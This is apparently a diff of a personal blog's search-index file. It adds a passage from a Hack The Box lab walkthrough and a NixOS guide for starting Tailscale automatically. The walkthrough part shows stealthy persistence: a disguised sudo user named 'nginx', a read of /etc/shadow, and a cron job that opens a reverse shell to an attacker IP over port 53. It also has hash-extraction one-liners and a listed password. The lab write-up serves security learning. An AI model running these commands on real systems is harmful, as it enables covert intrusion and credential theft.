machine and will raise less suspicion.\nsudo useradd -m -s /bin/bash nginx Creates a new user named nginx. -m: Creates a home directory for the user. -s /bin/bash: Sets the user\u0026rsquo;s default shell to /bin/bash. sudo usermod -aG sudo nginx Adds the nginx user to the sudo group. -a: Appends the user to the group (avoids overwriting existing groups). -G sudo: Specifies the sudo group. sudo passwd nginx Sets or updates the password for the nginx user. Prompts us to add a new password and confirms it. Let\u0026rsquo;s switch to the newly created user to ensure it works.\nsu nginx Let\u0026rsquo;s check we have sudo privileges.\nsudo -l Let\u0026rsquo;s ensure we can actually read sudo level files by reading /etc/shadow As we can see we do.\nCreating a cron job reverse shell: Having a high privilege user is good and all but not ideal if we can\u0026rsquo;t access it due to ip whitelisting, so instead let\u0026rsquo;s create a cronjob reverse shell….I know, I know we could update iptables, but where is the fun in that?\n(crontab -l \u0026gt; .tab ; echo \u0026#34;* * * * * /bin/bash -c \u0026#39;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.22/53 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34; \u0026gt;\u0026gt; .tab ; crontab .tab ; rm .tab) \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 We will set it to run every 1 minute and also use port 53 (DNS) so it blends in. Let\u0026rsquo;s verify it\u0026rsquo;s in the crontab by running crontab -l As we can see it\u0026rsquo;s running.\nI start my listener and get a connection back after 1 minute. Note: This is great as a means to call back out to our attack machine, however an interval of every 1 minute is excessive, it would typically be better to set it at longer intervals to re-connect. Lessons Learned: What did I learn? This was mainly done to re-cement some more SQLi studying I have done recently as I am working my way through the portswigger academy training and this was a great way to drill that down so it helped alot. I learned alot about header injection, which is fairly new to me. What silly mistakes did I make? I didn\u0026rsquo;t output to stderr when creating my initial command injection curl command and could not figure out why it wasn\u0026rsquo;t working, then it dawned on me. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at bloodstiller dot com\nCREDS: Compiled Usernames, Passwords \u0026amp; Hashes: Usernames: uhc ippsec celesian big0us luska tinyboy Root Admin Passwords: uhc-11qual-global-pw Email Names: Username \u0026amp; Pass: Hashes: Extract all hashes from netexec Extract only enabled hashes: grep -iv disabled /home/kali/.nxc/logs/*.ntds | cut -d ':' -f2,5 --output-delimiter=' ' | awk '{print $2, $1}' Extract all hashes cat /home/kali/.nxc/logs/*.ntds | cut -d ':' -f1,2,4 --output-delimiter=' ' | awk '{print $3, $2, $1}' Note: We need to include disabled hashes to get the krbtgt hash in this method as that account is disabled by default. SSH Keys: ", 
+        "url": "http:\/\/localhost:1313\/walkthroughs\/union-box\/"
+    },
+    
+    "http:\/\/localhost:1313\/walkthroughs\/": {
+        "title": "Walkthroughs",
+        "tags": [],
+        "content": "", 
+        "url": "http:\/\/localhost:1313\/walkthroughs\/"
+    },
+    
+    "http:\/\/localhost:1313\/tags\/web\/": {
+        "title": "Web",
+        "tags": [],
+        "content": "", 
+        "url": "http:\/\/localhost:1313\/tags\/web\/"
+    },
+    
+    "http:\/\/localhost:1313\/homelab\/202050222_tailscalenixos\/": {
+        "title": "Autostart Tailscale on NixOS system boot \u0026 rebuild with mullvad integration",
+        "tags": ["nixos","tailscale","homelab","networking","vpn","system","configuration",],
+        "content": "This was originally posted on 2025-02-23 however I have since added the mullvad integration into this so have updated the guide to reflect this.\n+Note+: You do not need the mullvad integration for this to work, I have highlighted the arguments to add if you are going to use mullvad. Are you tired of running sudo tailscale up every time you login, I know I am. So I thought why spend under two seconds waiting for something to run and using auto complete with ZSH to easily find the command when I can easily create a service that launches Tailscale on boot for me and re-launches on every rebuild of the system.\nThis configuration will ensure that:\nTailscale starts automatically with your system. You don\u0026rsquo;t need to manually authenticate each time. Your authentication key is stored securely using sops /sops-nix The connection is established only when needed (won\u0026rsquo;t try to reconnect if already connected). All non lan traffic is routed over mullvad. This assumes you already have a Tailscale account with the mullvad extension and sops setup, if you don\u0026rsquo;t please see guides below.\nTailscale quick start guide Install sops-nix Generating The Tailscale Auth Key: As we want to automate the process of authenticating of connecting our NixOS host to the Tailscale network we will need to generate an auth key. This will mean we do not have to follow the provided Tailscale links when adding the host to the network or re-authorizing. +Note+: Even if you have already added your host to the Tailscale network this process is still the same. Login to your account and click \u0026ldquo;Settings\u0026rdquo; \u0026ndash;\u0026gt; \u0026ldquo;Personal Settings\u0026rdquo; \u0026ndash;\u0026gt; \u0026ldquo;Keys\u0026rdquo; \u0026ndash;\u0026gt; \u0026ldquo;Generate Auth Key\u0026rdquo;\nKey settings, give your key a memorable name and also set it for the amount of time you want it to be valid for, I have set it for the max 90 days have added a reminder to my todo list to regenerate one in 85 days.\nYou should now have a Tailscale auth key.\nAdding Tailscale Auth Key To Sops: It\u0026rsquo;s now time to add our Tailscale Auth Key to sops so our system has access to it.\n# If your sops file is called something different obviously you need to enter that... sops secrets.yaml # Store it in this format is important as we will be calling it later as a variable tailscale_preauth: | TAILSCALE_AUTH_KEY=tskey-auth-xxxxx-xxxxxxxxxxxxx +Note+: It is also possible to use age for this however I personally use stops as it also allows integration with home-manager. Edit your configuration.nix and add the secret so it\u0026rsquo;s accessible by other services.\nsops = { defaultSopsFile = ./packages/sops/secrets.yaml; age.keyFile = \u0026#34;/home/martin/.config/sops/age/keys.txt\u0026#34;; # I have other sops secerts here but have removed for brevity secrets.tailscale_preauth = { }; }; +Important+: The part secrets.tailscale_preauth has to match name that was placed into the sops secrets.yaml as this is the key for the value referenced. So if in your sops secrets file you called it ts-key you would write secrets.ts-key +Note+: This has to be done in configuration.nix \u0026amp; not home-manager as this is a system wide service that is running and not a user specific service. Choosing a mullvad exit node for tailscale. If you are planning on using mullvad please ensure you add the service (it\u0026rsquo;s chargeable) by following the tailscale documentation here .\nYou will also need to select an exit node. You can do this by running one of the following commands.\n# Get list of exit nodes tailscale exit-node list # Get a list of exit nodes by country tailscale exit-node list --filter=[country name] #Example tailscale exit-node list --filter=USA # You can also get tailscale to suggest an exit node tailscale exit-node suggest Now that you have an exit node, take a note of it.\nCreating The Tailscale Service: Edit your NixOS configuration.nix and add the below service. # Add tailscale to your system packages environment.systemPackages = [ pkgs.tailscale ]; # Enable the tailscale service services.tailscale.enable = true; #Required for resolution when using mullvad. services.tailscale.useRoutingFeatures = \u0026#34;client\u0026#34;; # Create a oneshot to autoconnect on rebuild/switch systemd.services.tailscale-autoconnect = { description = \u0026#34;Automatic connection to Tailscale\u0026#34;; after = [ \u0026#34;network-pre.target\u0026#34; \u0026#34;tailscale.service\u0026#34; ]; wants = [ \u0026#34;network-pre.target\u0026#34; \u0026#34;tailscale.service\u0026#34; ]; wantedBy = [ \u0026#34;multi-user.target\u0026#34; ]; serviceConfig = { Type = \u0026#34;oneshot\u0026#34;; # Pass our tailscale auth key from sops as a Environmental Variable EnvironmentFile = config.sops.secrets.tailscale_preauth.path; }; # have the job run this shell script script = with pkgs; \u0026#39;\u0026#39; # wait for tailscaled to settle sleep 2 # check if we are already authenticated to tailscale status=\u0026#34;$(${tailscale}/bin/tailscale status -json | ${jq}/bin/jq -r .BackendState)\u0026#34; if [ $status = \u0026#34;Running\u0026#34; ]; then # if so, then do nothing exit 0 fi # otherwise authenticate with tailscale using the key from secrets # Not using mullvad exit node: ${tailscale}/bin/tailscale up -authkey \u0026#34;$TAILSCALE_AUTH_KEY\u0026#34; --accept-routes=true --reset # Using mullvad exit node: # ${tailscale}/bin/tailscale up -authkey \u0026#34;$TAILSCALE_AUTH_KEY\u0026#34; --exit-node-allow-lan-access --exit-node=gb-mnc-wg-201.mullvad.ts.net --accept-routes=true --reset --acccept-dns=true` \u0026#39;\u0026#39;; }; +Important+: As stated before if you have called your Tailscale Auth key in your secrets file something other than tailscale_preauth you will then have to modify the line below. # Pass our tailscale auth key from sops as a Environmental Variable EnvironmentFile = config.sops.secrets.tailscale_preauth.path; Breaking Down The Configuration: Let\u0026rsquo;s break down what each part of this configuration does:\nSystem Package and Service Setup:\nenvironment.systemPackages = [ pkgs.tailscale ] adds the Tailscale package to your system services.tailscale.enable = true enables the Tailscale daemon service services.tailscale.useRoutingFeatures = \u0026quot;client\u0026quot;; The article in the NixOS Wiki about tailscale explains this better If you are using features like subnet routers or exit nodes you will also need to set services.tailscale.useRoutingFeatures to \u0026ldquo;server\u0026rdquo;, \u0026ldquo;client\u0026rdquo; or \u0026ldquo;both\u0026rdquo; depending on the role of your machine.\nAs we are a client in this situation we will set it as client. Automatic Connection Service: The systemd.services.tailscale-autoconnect section creates a systemd service that:\nRuns once during system startup (Type = \u0026quot;oneshot\u0026quot;) Starts after networking and the Tailscale daemon are ready Loads your authentication key from the sops-encrypted file ${tailscale}/bin/tailscale up -authkey \u0026quot;$TAILSCALE_AUTH_KEY\u0026quot; --accept-routes=true Connection Script Logic: The script section:\nWaits 2 seconds for the Tailscale daemon to fully start sleep 2 Checks if you\u0026rsquo;re already connected to Tailscale by querying its status. status=\u0026quot;$(${tailscale}/bin/tailscale status -json | ${jq}/bin/jq -r .BackendState)\u0026quot; If already connected (Running state), exits without doing anything. if [ $status = \u0026quot;Running\u0026quot; ]; then # if so, then do nothing If not connected, authenticates using your stored auth key and passing the relevant arguments. If you are not using mullvad use this one! tailscale up -authkey \u0026quot;$TAILSCALE_AUTH_KEY\u0026quot; --accept-routes=true --reset +Note+: I also use some of my nodes as routers within my home network to allow access to other hosts so I also pass the --accept-routes=true argument, however if you don\u0026rsquo;t do this you can omit this argument. If you are using mullvad use this one! tailscale up -authkey \u0026quot;$TAILSCALE_AUTH_KEY\u0026quot; --exit-node-allow-lan-access --exit-node=gb-mnc-wg-201.mullvad.ts.net --accept-routes=true --reset --acccept-dns=true +Note+: Ensure you add the exit node you have chosen. Rebuilding The System: That\u0026rsquo;s it now run either:\nsudo nixos-rebuild switch flake [location/of/flake] sudo nixos-rebuild switch Check Tailscale is running \u0026amp; connected\n+Note+: If you have already had this service running a you will need to actually run a manual tailscale command too:\nsudo tailscale up --accept-dns=true --accept-routes --exit-node=gb-mnc-wg-201.mullvad.ts.net --exit-node-allow-lan-access --reset ", 
+        "url": "http:\/\/localhost:1313\/homelab\/202050222_tailscalenixos\/"
     },
     
     "http:\/\/localhost:1313\/tags\/configuration\/": {
@@ -618,13 +744,6 @@ window.store = {
         "tags": [],
         "content": "", 
         "url": "http:\/\/localhost:1313\/tags\/system\/"
-    },
-    
-    "http:\/\/localhost:1313\/tags\/": {
-        "title": "Tags",
-        "tags": [],
-        "content": "", 
-        "url": "http:\/\/localhost:1313\/tags\/"
     },
     
     "http:\/\/localhost:1313\/tags\/tailscale\/": {
@@ -921,13 +1040,6 @@ window.store = {
         "url": "http:\/\/localhost:1313\/tags\/hack-the-box\/"
     },
     
-    "http:\/\/localhost:1313\/tags\/htb\/": {
-        "title": "HTB",
-        "tags": [],
-        "content": "", 
-        "url": "http:\/\/localhost:1313\/tags\/htb\/"
-    },
-    
     "http:\/\/localhost:1313\/tags\/ibm-db2\/": {
         "title": "Ibm-Db2",
         "tags": [],
@@ -977,13 +1089,6 @@ window.store = {
         "url": "http:\/\/localhost:1313\/tags\/keepass2john\/"
     },
     
-    "http:\/\/localhost:1313\/tags\/medium\/": {
-        "title": "Medium",
-        "tags": [],
-        "content": "", 
-        "url": "http:\/\/localhost:1313\/tags\/medium\/"
-    },
-    
     "http:\/\/localhost:1313\/tags\/password-cracking\/": {
         "title": "Password Cracking",
         "tags": [],
@@ -1017,13 +1122,6 @@ window.store = {
         "tags": [],
         "content": "", 
         "url": "http:\/\/localhost:1313\/tags\/smb\/"
-    },
-    
-    "http:\/\/localhost:1313\/walkthroughs\/": {
-        "title": "Walkthroughs",
-        "tags": [],
-        "content": "", 
-        "url": "http:\/\/localhost:1313\/walkthroughs\/"
     },
     
     "http:\/\/localhost:1313\/tags\/war\/": {
@@ -1073,13 +1171,6 @@ window.store = {
         "tags": [],
         "content": "", 
         "url": "http:\/\/localhost:1313\/tags\/java\/"
-    },
-    
-    "http:\/\/localhost:1313\/tags\/linux\/": {
-        "title": "Linux",
-        "tags": [],
-        "content": "", 
-        "url": "http:\/\/localhost:1313\/tags\/linux\/"
     },
     
     "http:\/\/localhost:1313\/tags\/magic-bytes\/": {
@@ -1199,13 +1290,6 @@ window.store = {
         "tags": [],
         "content": "", 
         "url": "http:\/\/localhost:1313\/tags\/xp_cmdshell\/"
-    },
-    
-    "http:\/\/localhost:1313\/tags\/box\/": {
-        "title": "Box",
-        "tags": [],
-        "content": "", 
-        "url": "http:\/\/localhost:1313\/tags\/box\/"
     },
     
     "http:\/\/localhost:1313\/tags\/cap\/": {
@@ -2706,13 +2790,6 @@ window.store = {
         "url": "http:\/\/localhost:1313\/tags\/csharp\/"
     },
     
-    "http:\/\/localhost:1313\/tags\/sql\/": {
-        "title": "SQL",
-        "tags": [],
-        "content": "", 
-        "url": "http:\/\/localhost:1313\/tags\/sql\/"
-    },
-    
     "http:\/\/localhost:1313\/tags\/sqlite\/": {
         "title": "SQLite",
         "tags": [],
@@ -3063,25 +3140,11 @@ window.store = {
         "url": "http:\/\/localhost:1313\/walkthroughs\/return-box\/"
     },
     
-    "http:\/\/localhost:1313\/posts\/20240403073323-credentialed_enumeration_in_ad\/": {
-        "title": "",
-        "tags": [],
-        "content": "Table of Contents M-x\n", 
-        "url": "http:\/\/localhost:1313\/posts\/20240403073323-credentialed_enumeration_in_ad\/"
-    },
-    
     "http:\/\/localhost:1313\/categories\/": {
         "title": "Categories",
         "tags": [],
         "content": "", 
         "url": "http:\/\/localhost:1313\/categories\/"
-    },
-    
-    "http:\/\/localhost:1313\/posts\/": {
-        "title": "Posts",
-        "tags": [],
-        "content": "", 
-        "url": "http:\/\/localhost:1313\/posts\/"
     },
     
 }
